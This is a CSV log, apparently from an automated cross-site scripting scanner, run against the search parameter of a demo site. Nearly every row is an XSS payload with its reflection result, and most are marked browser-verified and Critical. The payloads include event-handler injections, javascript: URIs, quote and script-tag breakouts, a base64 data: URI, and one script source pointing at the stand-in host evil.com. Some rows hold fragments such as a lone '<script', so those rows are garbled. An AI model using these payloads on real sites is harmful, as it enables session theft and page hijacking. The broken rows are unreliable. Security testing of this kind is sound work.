Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 17:45:06.772,2026-01-10 17:45:07.588,0.816,https://demo-knsl.onrender.com/search,GET,q,<a href=j&#97vascript:alert(1)>X</a>,RAW_REFLECTION,No,,High
2026-01-10 17:45:07.494,2026-01-10 17:45:07.595,0.101,https://demo-knsl.onrender.com/search,GET,q,<input autofocus onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:07.497,2026-01-10 17:45:07.611,0.114,https://demo-knsl.onrender.com/search,GET,q,<textarea autofocus onfocus=alert(1)></textarea>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:07.559,2026-01-10 17:45:07.657,0.098,https://demo-knsl.onrender.com/search,GET,q,<div onpointerover=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:07.578,2026-01-10 17:45:07.680,0.102,https://demo-knsl.onrender.com/search,GET,q,<div onpointerenter=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:07.586,2026-01-10 17:45:07.681,0.095,https://demo-knsl.onrender.com/search,GET,q,<div onpointerleave=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:07.595,2026-01-10 17:45:07.691,0.097,https://demo-knsl.onrender.com/search,GET,q,<div ontouchend=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:07.611,2026-01-10 17:45:07.711,0.100,https://demo-knsl.onrender.com/search,GET,q,<div ontouchmove=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:07.657,2026-01-10 17:45:07.724,0.067,https://demo-knsl.onrender.com/search,GET,q,"<div style=""animation:spin 1s"" onanimationstart=alert(1)>X</div>",NO_REFLECTION,No,,Info
2026-01-10 17:45:07.587,2026-01-10 17:45:07.728,0.142,https://demo-knsl.onrender.com/search,GET,q,<div onpointermove=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:07.511,2026-01-10 17:45:07.740,0.228,https://demo-knsl.onrender.com/search,GET,q,<select autofocus onfocus=alert(1)></select>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:07.681,2026-01-10 17:45:07.751,0.070,https://demo-knsl.onrender.com/search,GET,q,"<div style=""animation:spin 1s"" onanimationiteration=alert(1)>X</div>",NO_REFLECTION,No,,Info
2026-01-10 17:45:07.680,2026-01-10 17:45:07.751,0.072,https://demo-knsl.onrender.com/search,GET,q,"<div style=""animation:spin 1s"" onanimationend=alert(1)>X</div>",NO_REFLECTION,No,,Info
2026-01-10 17:45:07.691,2026-01-10 17:45:07.769,0.078,https://demo-knsl.onrender.com/search,GET,q,"<div style=""transition:all 1s"" ontransitionend=alert(1)>X</div>",NO_REFLECTION,No,,Info
2026-01-10 17:45:07.728,2026-01-10 17:45:07.787,0.059,https://demo-knsl.onrender.com/search,GET,q,<div contenteditable oninput=alert(1)>X</div>,NO_REFLECTION,No,,Info
2026-01-10 17:45:07.751,2026-01-10 17:45:07.810,0.059,https://demo-knsl.onrender.com/search,GET,q,<select><option oninput=alert(1)>X</option></select>,NO_REFLECTION,No,,Info
2026-01-10 17:45:07.711,2026-01-10 17:45:07.812,0.101,https://demo-knsl.onrender.com/search,GET,q,<div data-x=x onclick=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:07.724,2026-01-10 17:45:07.846,0.122,https://demo-knsl.onrender.com/search,GET,q,<input accesskey=x onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:07.740,2026-01-10 17:45:07.908,0.168,https://demo-knsl.onrender.com/search,GET,q,<input type=hidden onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:07.751,2026-01-10 17:45:07.924,0.173,https://demo-knsl.onrender.com/search,GET,q,"<img/src=""x""/onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:07.787,2026-01-10 17:45:07.925,0.137,https://demo-knsl.onrender.com/search,GET,q,<img	src=x	onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:07.769,2026-01-10 17:45:07.929,0.160,https://demo-knsl.onrender.com/search,GET,q,<img%20src=x%20onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:07.812,2026-01-10 17:45:08.030,0.218,https://demo-knsl.onrender.com/search,GET,q,<script,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:07.810,2026-01-10 17:45:08.031,0.220,https://demo-knsl.onrender.com/search,GET,q,<script	>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:07.846,2026-01-10 17:45:08.089,0.242,https://demo-knsl.onrender.com/search,GET,q,>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:07.908,2026-01-10 17:45:08.089,0.181,https://demo-knsl.onrender.com/search,GET,q,<script,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:07.924,2026-01-10 17:45:08.092,0.168,https://demo-knsl.onrender.com/search,GET,q,src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:07.929,2026-01-10 17:45:08.092,0.163,https://demo-knsl.onrender.com/search,GET,q,<svg/onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:07.925,2026-01-10 17:45:08.095,0.170,https://demo-knsl.onrender.com/search,GET,q,<svg/onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.030,2026-01-10 17:45:08.146,0.116,https://demo-knsl.onrender.com/search,GET,q,<svg/onload=print()>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.031,2026-01-10 17:45:08.157,0.126,https://demo-knsl.onrender.com/search,GET,q,<marquee onstart=prompt(1)>X</marquee>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.089,2026-01-10 17:45:08.209,0.120,https://demo-knsl.onrender.com/search,GET,q,<iframe/src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.089,2026-01-10 17:45:08.209,0.120,https://demo-knsl.onrender.com/search,GET,q,<marquee onstart=confirm(1)>X</marquee>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.092,2026-01-10 17:45:08.212,0.120,https://demo-knsl.onrender.com/search,GET,q,<iframe/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.092,2026-01-10 17:45:08.212,0.120,https://demo-knsl.onrender.com/search,GET,q,<iframe%20src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.095,2026-01-10 17:45:08.214,0.119,https://demo-knsl.onrender.com/search,GET,q,<object/data=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.146,2026-01-10 17:45:08.257,0.111,https://demo-knsl.onrender.com/search,GET,q,"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.157,2026-01-10 17:45:08.266,0.109,https://demo-knsl.onrender.com/search,GET,q,<embed/src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:07.546,2026-01-10 17:45:08.272,0.726,https://demo-knsl.onrender.com/search,GET,q,<div onpointerup=alert(1)>X</div>,RAW_REFLECTION,No,,High
2026-01-10 17:45:07.530,2026-01-10 17:45:08.291,0.762,https://demo-knsl.onrender.com/search,GET,q,<div onpointerdown=alert(1)>X</div>,RAW_REFLECTION,No,,High
2026-01-10 17:45:08.209,2026-01-10 17:45:08.310,0.101,https://demo-knsl.onrender.com/search,GET,q,<var onmouseover=alert(1)>X</var>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:07.588,2026-01-10 17:45:08.317,0.729,https://demo-knsl.onrender.com/search,GET,q,<div ontouchstart=alert(1)>X</div>,RAW_REFLECTION,No,,High
2026-01-10 17:45:08.209,2026-01-10 17:45:08.325,0.116,https://demo-knsl.onrender.com/search,GET,q,"<embed src=data:text/html,<script>alert(1)</script>>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.214,2026-01-10 17:45:08.350,0.135,https://demo-knsl.onrender.com/search,GET,q,<p onmouseover=alert(1)>X</p>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.266,2026-01-10 17:45:08.375,0.110,https://demo-knsl.onrender.com/search,GET,q,<h2 onmouseover=alert(1)>X</h2>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.272,2026-01-10 17:45:08.377,0.105,https://demo-knsl.onrender.com/search,GET,q,<pre onmouseover=alert(1)>X</pre>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.291,2026-01-10 17:45:08.524,0.232,https://demo-knsl.onrender.com/search,GET,q,<blockquote onmouseover=alert(1)>X</blockquote>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.310,2026-01-10 17:45:08.524,0.214,https://demo-knsl.onrender.com/search,GET,q,<ol onmouseover=alert(1)><li>X</li></ol>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.325,2026-01-10 17:45:08.528,0.203,https://demo-knsl.onrender.com/search,GET,q,<li onmouseover=alert(1)>X</li>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.317,2026-01-10 17:45:08.528,0.211,https://demo-knsl.onrender.com/search,GET,q,<ul onmouseover=alert(1)><li>X</li></ul>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.350,2026-01-10 17:45:08.533,0.184,https://demo-knsl.onrender.com/search,GET,q,<dl onmouseover=alert(1)><dt>X</dt></dl>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.375,2026-01-10 17:45:08.533,0.158,https://demo-knsl.onrender.com/search,GET,q,<dt onmouseover=alert(1)>X</dt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.377,2026-01-10 17:45:08.539,0.162,https://demo-knsl.onrender.com/search,GET,q,<dd onmouseover=alert(1)>X</dd>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.528,2026-01-10 17:45:08.592,0.064,https://demo-knsl.onrender.com/search,GET,q,<table><caption onmouseover=alert(1)>X</caption></table>,NO_REFLECTION,No,,Info
2026-01-10 17:45:08.524,2026-01-10 17:45:08.656,0.132,https://demo-knsl.onrender.com/search,GET,q,<legend onmouseover=alert(1)>X</legend>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.524,2026-01-10 17:45:08.656,0.132,https://demo-knsl.onrender.com/search,GET,q,<fieldset onmouseover=alert(1)>X</fieldset>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.528,2026-01-10 17:45:08.661,0.133,https://demo-knsl.onrender.com/search,GET,q,<label onmouseover=alert(1)>X</label>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.539,2026-01-10 17:45:08.661,0.122,https://demo-knsl.onrender.com/search,GET,q,<table><thead onmouseover=alert(1)></thead></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.533,2026-01-10 17:45:08.665,0.132,https://demo-knsl.onrender.com/search,GET,q,<table><colgroup onmouseover=alert(1)></colgroup></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.533,2026-01-10 17:45:08.665,0.132,https://demo-knsl.onrender.com/search,GET,q,<table><col onmouseover=alert(1)></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.592,2026-01-10 17:45:08.705,0.113,https://demo-knsl.onrender.com/search,GET,q,<table><tbody onmouseover=alert(1)></tbody></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.665,2026-01-10 17:45:08.792,0.127,https://demo-knsl.onrender.com/search,GET,q,<meter onmouseover=alert(1)>X</meter>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.656,2026-01-10 17:45:08.792,0.136,https://demo-knsl.onrender.com/search,GET,q,<table><tr onmouseover=alert(1)></tr></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.661,2026-01-10 17:45:08.798,0.136,https://demo-knsl.onrender.com/search,GET,q,<table><td onmouseover=alert(1)>X</td></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.661,2026-01-10 17:45:08.799,0.138,https://demo-knsl.onrender.com/search,GET,q,<table><th onmouseover=alert(1)>X</th></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.656,2026-01-10 17:45:08.801,0.145,https://demo-knsl.onrender.com/search,GET,q,<table><tfoot onmouseover=alert(1)></tfoot></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.665,2026-01-10 17:45:08.802,0.137,https://demo-knsl.onrender.com/search,GET,q,<progress onmouseover=alert(1)>X</progress>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.705,2026-01-10 17:45:08.830,0.125,https://demo-knsl.onrender.com/search,GET,q,<output onmouseover=alert(1)>X</output>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.792,2026-01-10 17:45:08.911,0.119,https://demo-knsl.onrender.com/search,GET,q,<time onmouseover=alert(1)>X</time>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.798,2026-01-10 17:45:08.915,0.118,https://demo-knsl.onrender.com/search,GET,q,<ruby onmouseover=alert(1)>X</ruby>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.792,2026-01-10 17:45:08.916,0.123,https://demo-knsl.onrender.com/search,GET,q,<mark onmouseover=alert(1)>X</mark>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.802,2026-01-10 17:45:08.918,0.117,https://demo-knsl.onrender.com/search,GET,q,<bdi onmouseover=alert(1)>X</bdi>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.799,2026-01-10 17:45:08.918,0.120,https://demo-knsl.onrender.com/search,GET,q,<ruby><rt onmouseover=alert(1)>X</rt></ruby>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.801,2026-01-10 17:45:08.941,0.140,https://demo-knsl.onrender.com/search,GET,q,<ruby><rp onmouseover=alert(1)>X</rp></ruby>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.830,2026-01-10 17:45:08.941,0.111,https://demo-knsl.onrender.com/search,GET,q,<bdo onmouseover=alert(1)>X</bdo>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.918,2026-01-10 17:45:09.025,0.107,https://demo-knsl.onrender.com/search,GET,q,<strong onmouseover=alert(1)>X</strong>,NO_REFLECTION,No,,Info
2026-01-10 17:45:08.916,2026-01-10 17:45:09.040,0.125,https://demo-knsl.onrender.com/search,GET,q,<del onmouseover=alert(1)>X</del>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.911,2026-01-10 17:45:09.040,0.129,https://demo-knsl.onrender.com/search,GET,q,<wbr onmouseover=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.941,2026-01-10 17:45:09.044,0.103,https://demo-knsl.onrender.com/search,GET,q,<em onmouseover=alert(1)>X</em>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.212,2026-01-10 17:45:09.044,0.832,https://demo-knsl.onrender.com/search,GET,q,<span onmouseover=alert(1)>X</span>,RAW_REFLECTION,No,,High
2026-01-10 17:45:08.915,2026-01-10 17:45:09.044,0.129,https://demo-knsl.onrender.com/search,GET,q,<ins onmouseover=alert(1)>X</ins>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.257,2026-01-10 17:45:09.044,0.787,https://demo-knsl.onrender.com/search,GET,q,<h1 onmouseover=alert(1)>X</h1>,RAW_REFLECTION,No,,High
2026-01-10 17:45:08.941,2026-01-10 17:45:09.047,0.106,https://demo-knsl.onrender.com/search,GET,q,<b onmouseover=alert(1)>X</b>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.212,2026-01-10 17:45:09.048,0.837,https://demo-knsl.onrender.com/search,GET,q,<code onmouseover=alert(1)>X</code>,RAW_REFLECTION,No,,High
2026-01-10 17:45:09.025,2026-01-10 17:45:09.257,0.231,https://demo-knsl.onrender.com/search,GET,q,<i onmouseover=alert(1)>X</i>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.040,2026-01-10 17:45:09.257,0.217,https://demo-knsl.onrender.com/search,GET,q,<s onmouseover=alert(1)>X</s>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.044,2026-01-10 17:45:09.262,0.218,https://demo-knsl.onrender.com/search,GET,q,<sup onmouseover=alert(1)>X</sup>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.044,2026-01-10 17:45:09.262,0.218,https://demo-knsl.onrender.com/search,GET,q,<sub onmouseover=alert(1)>X</sub>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.047,2026-01-10 17:45:09.265,0.218,https://demo-knsl.onrender.com/search,GET,q,<article onmouseover=alert(1)>X</article>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.048,2026-01-10 17:45:09.265,0.217,https://demo-knsl.onrender.com/search,GET,q,<aside onmouseover=alert(1)>X</aside>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.044,2026-01-10 17:45:09.269,0.225,https://demo-knsl.onrender.com/search,GET,q,<address onmouseover=alert(1)>X</address>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.265,2026-01-10 17:45:09.329,0.064,https://demo-knsl.onrender.com/search,GET,q,<section onmouseover=alert(1)>X</section>,NO_REFLECTION,No,,Info
2026-01-10 17:45:09.262,2026-01-10 17:45:09.369,0.107,https://demo-knsl.onrender.com/search,GET,q,<hgroup onmouseover=alert(1)>X</hgroup>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.257,2026-01-10 17:45:09.369,0.112,https://demo-knsl.onrender.com/search,GET,q,<header onmouseover=alert(1)>X</header>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.257,2026-01-10 17:45:09.374,0.117,https://demo-knsl.onrender.com/search,GET,q,<footer onmouseover=alert(1)>X</footer>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.262,2026-01-10 17:45:09.374,0.113,https://demo-knsl.onrender.com/search,GET,q,<nav onmouseover=alert(1)>X</nav>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.265,2026-01-10 17:45:09.383,0.118,https://demo-knsl.onrender.com/search,GET,q,<main onmouseover=alert(1)>X</main>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.269,2026-01-10 17:45:09.397,0.128,https://demo-knsl.onrender.com/search,GET,q,<figure onmouseover=alert(1)>X</figure>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.329,2026-01-10 17:45:09.403,0.074,https://demo-knsl.onrender.com/search,GET,q,<figcaption onmouseover=alert(1)>X</figcaption>,NO_REFLECTION,No,,Info
2026-01-10 17:45:09.397,2026-01-10 17:45:09.463,0.066,https://demo-knsl.onrender.com/search,GET,q,<button onclick=alert(1)>X</button>,NO_REFLECTION,No,,Info
2026-01-10 17:45:09.403,2026-01-10 17:45:09.489,0.087,https://demo-knsl.onrender.com/search,GET,q,<button ondblclick=alert(1)>X</button>,NO_REFLECTION,No,,Info
2026-01-10 17:45:09.369,2026-01-10 17:45:09.492,0.123,https://demo-knsl.onrender.com/search,GET,q,<menu onmouseover=alert(1)>X</menu>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.374,2026-01-10 17:45:09.493,0.118,https://demo-knsl.onrender.com/search,GET,q,<details><summary onmouseover=alert(1)>X</summary></details>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.369,2026-01-10 17:45:09.495,0.127,https://demo-knsl.onrender.com/search,GET,q,<dialog onmouseover=alert(1)>X</dialog>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.374,2026-01-10 17:45:09.497,0.122,https://demo-knsl.onrender.com/search,GET,q,<menuitem onmouseover=alert(1)>X</menuitem>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.383,2026-01-10 17:45:09.498,0.115,https://demo-knsl.onrender.com/search,GET,q,<canvas onmouseover=alert(1)>X</canvas>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.463,2026-01-10 17:45:09.522,0.059,https://demo-knsl.onrender.com/search,GET,q,<button onmousedown=alert(1)>X</button>,NO_REFLECTION,No,,Info
2026-01-10 17:45:09.489,2026-01-10 17:45:09.563,0.074,https://demo-knsl.onrender.com/search,GET,q,<button onmouseup=alert(1)>X</button>,NO_REFLECTION,No,,Info
2026-01-10 17:45:09.492,2026-01-10 17:45:09.596,0.105,https://demo-knsl.onrender.com/search,GET,q,"""><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.498,2026-01-10 17:45:09.600,0.102,https://demo-knsl.onrender.com/search,GET,q,""";alert(1);//",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.497,2026-01-10 17:45:09.612,0.115,https://demo-knsl.onrender.com/search,GET,q,';alert(1);//,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.495,2026-01-10 17:45:09.612,0.116,https://demo-knsl.onrender.com/search,GET,q,"""></script><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.493,2026-01-10 17:45:09.623,0.130,https://demo-knsl.onrender.com/search,GET,q,'><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.522,2026-01-10 17:45:09.639,0.117,https://demo-knsl.onrender.com/search,GET,q,""" onmouseover=alert(1) x=""",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.563,2026-01-10 17:45:09.677,0.114,https://demo-knsl.onrender.com/search,GET,q,"""onmouseover=""alert(1)",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.612,2026-01-10 17:45:09.752,0.140,https://demo-knsl.onrender.com/search,GET,q,</script><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.612,2026-01-10 17:45:09.752,0.140,https://demo-knsl.onrender.com/search,GET,q,' autofocus onfocus=alert(1) x=',RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.600,2026-01-10 17:45:09.756,0.155,https://demo-knsl.onrender.com/search,GET,q,""" autofocus onfocus=alert(1) x=""",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.596,2026-01-10 17:45:09.756,0.160,https://demo-knsl.onrender.com/search,GET,q,' onmouseover=alert(1) x=',RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.623,2026-01-10 17:45:09.759,0.136,https://demo-knsl.onrender.com/search,GET,q,</script><img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.639,2026-01-10 17:45:09.761,0.122,https://demo-knsl.onrender.com/search,GET,q,</script><svg onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:08.918,2026-01-10 17:45:09.779,0.861,https://demo-knsl.onrender.com/search,GET,q,<small onmouseover=alert(1)>X</small>,RAW_REFLECTION,No,,High
2026-01-10 17:45:09.677,2026-01-10 17:45:09.786,0.109,https://demo-knsl.onrender.com/search,GET,q,--><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.752,2026-01-10 17:45:09.862,0.110,https://demo-knsl.onrender.com/search,GET,q,--!><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.756,2026-01-10 17:45:09.874,0.118,https://demo-knsl.onrender.com/search,GET,q,<q/onclick=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.759,2026-01-10 17:45:09.874,0.115,https://demo-knsl.onrender.com/search,GET,q,<q/onerror=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.752,2026-01-10 17:45:09.877,0.126,https://demo-knsl.onrender.com/search,GET,q,<q/oncut=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.761,2026-01-10 17:45:09.878,0.117,https://demo-knsl.onrender.com/search,GET,q,<a href=#x onclick=alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.779,2026-01-10 17:45:09.881,0.102,https://demo-knsl.onrender.com/search,GET,q,<a name=x onclick=alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.040,2026-01-10 17:45:09.890,0.849,https://demo-knsl.onrender.com/search,GET,q,<u onmouseover=alert(1)>X</u>,RAW_REFLECTION,No,,High
2026-01-10 17:45:09.044,2026-01-10 17:45:09.892,0.848,https://demo-knsl.onrender.com/search,GET,q,<abbr onmouseover=alert(1)>X</abbr>,RAW_REFLECTION,No,,High
2026-01-10 17:45:09.786,2026-01-10 17:45:09.892,0.106,https://demo-knsl.onrender.com/search,GET,q,<a href=x target=_blank onclick=alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.878,2026-01-10 17:45:09.937,0.059,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert(1) onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-10 17:45:09.862,2026-01-10 17:45:09.991,0.129,https://demo-knsl.onrender.com/search,GET,q,"'"">><marquee onstart=confirm(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.877,2026-01-10 17:45:09.999,0.122,https://demo-knsl.onrender.com/search,GET,q,<img src=x oneonerrorrror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.874,2026-01-10 17:45:09.999,0.125,https://demo-knsl.onrender.com/search,GET,q,"'"">><div onmouseover=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.890,2026-01-10 17:45:10.027,0.137,https://demo-knsl.onrender.com/search,GET,q,<input type=submit formaction=javascript:alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.892,2026-01-10 17:45:10.027,0.135,https://demo-knsl.onrender.com/search,GET,q,<form action=javascript:alert(1)><button>X</button></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.892,2026-01-10 17:45:10.030,0.138,https://demo-knsl.onrender.com/search,GET,q,<video poster=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.937,2026-01-10 17:45:10.069,0.133,https://demo-knsl.onrender.com/search,GET,q,<html manifest=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.999,2026-01-10 17:45:10.102,0.103,https://demo-knsl.onrender.com/search,GET,q,<img dynsrc=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.991,2026-01-10 17:45:10.102,0.111,https://demo-knsl.onrender.com/search,GET,q,<html xmlns:xss><xss:script>alert(1)</xss:script></html>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:09.999,2026-01-10 17:45:10.174,0.175,https://demo-knsl.onrender.com/search,GET,q,<img lowsrc=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
